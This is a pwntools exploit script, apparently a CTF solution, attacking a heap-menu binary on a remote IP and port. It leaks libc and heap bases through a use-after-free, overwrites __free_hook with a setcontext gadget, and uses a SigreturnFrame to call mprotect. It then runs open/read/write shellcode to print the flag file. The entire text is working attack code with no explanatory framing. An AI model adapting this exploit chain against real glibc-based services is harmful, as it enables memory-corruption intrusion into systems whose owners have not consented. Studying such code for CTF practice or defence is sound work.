from pwn import * 


context.log_level = 'debug'
# context.terminal = ['tmux', 'split', '-h']
context.arch = 'amd64'
# sh = process('./leaf')
sh = remote('119.45.24.140', 9349)

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.31.so')


def Write(Until, Text, opt = False):
    if not opt:
        sh.sendlineafter(Until, Text)
    else:
        sh.sendafter(Until, Text)

def Add(confession, val):
    Write('Choice:', '1')
    Write('.', confession, opt = True)
    Write('.', str(val))

def Dele(val):
    Write('Choice:', '4')
    Write('.', str(val))

def Exchange(val1, val2, opt):
    Write('Choice:', '2')
    Write('.', str(val1))
    Write('.', str(val2))
    sh.sendline(str(opt))

def Show(val):
    Write('Choice:', '3')
    Write('.', str(val))

def Edit(val, Content):
    Write('Choice:', '6')
    Write('?', str(val))
    Write('.', Content, opt = True)

def Xor():
    Write('Choice:', '5')

# now = 0
Add('a', 100)
Add('a', 200)
Add('a', 2)
for i in range(16): 
    Add('a' * 0xf00, 3 + i)
Add('a' * 0x930 + '\x00', 20)
Add('b\x00', 1)
for i in range(8):
    Add('a' * 0x80 + '\x00', 201 + i) # 21 - 28
Xor()
# now = 1
Add('a', 1000)
Xor()
Dele(1)
# now = 0
Exchange(201, 1000, 0)
Xor()
# now = 1
Dele(201)
Xor()
# now = 0
Show(201)
sh.recvuntil('\n')
libcbase = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00')) - libc.symbols['__malloc_hook'] - 0x70
log.success('libcbase: ' + hex(libcbase))
Xor()
# now = 1
for i in range(9):
    Add('a' * 0x60 + '\x00', 1001 + i)
for i in range(16):
    Add('a' * 0xf00 + '\x00', 1500 + i)
Xor()
# 0
Add('a' * 960 + '\x00', 201)
Xor()
# 1
Add('a' * 0x100 + '\x00', 1517)
for i in range(7):
    Add('a' * 0x100 + '\x00', 1600 + i)
Dele(1600)

Add('a' * 0x300 + '\x00', 5000)
Add('a' * 0x3c0 + '\x00', 5001) 
Add('a' * 0x3c0 + '\x00', 5002) 
Dele(5001)
Dele(1517)
Xor()
# now = 0
# Add('b' * 0x70 + '\x00', 201)
Exchange(201, 1000, 0)
Xor()
# now = 1
Dele(201)
Xor()
# now = 0
Show(201)
sh.recvuntil('\n')
heapbase = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x21e10
log.success('heapbase: ' + hex(heapbase))
free_hook = libc.symbols['__free_hook'] + libcbase
magic_addr = libcbase + libc.symbols['setcontext'] + 61
mprotect_addr = libcbase + libc.symbols['mprotect']
# Exchange_Addr = libcbase + 0x1547a0
Exchange_Addr = libcbase + 0x0000000000154930
Edit(201, p64(free_hook)[0:6])
Add('a' * 0x3c0 + '\x00', 201)
Add('a' * 0x3c0 + '\x00', 202)
Edit(202, p64(Exchange_Addr))
shellcode = '''
mov rax,0x67616c662f2e
push rax

mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall

mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall

mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall

mov rdi,0
mov rax,60
syscall
'''

frame = SigreturnFrame()
frame.rsp = heapbase + 0x10630 + 0x150
frame.rdi = heapbase
frame.rsi = 0x20000
frame.rdx = 4 | 2 | 1
frame.rip = mprotect_addr

payload = 'a' * 0x8 + p64(0x10630 + heapbase + 0x10) + p64(0x0) * 0x4 + p64(magic_addr) + str(frame)[0x28:]
payload = payload.ljust(0x150, 'a')

Edit(20, payload + p64(heapbase + 0x10630 + 0x158) + asm(shellcode))
# gdb.attach(sh, 'b * {0}'.format(Exchange_Addr))
# Dele(201)
# now = 1
Dele(20)
  


sh.interactive()
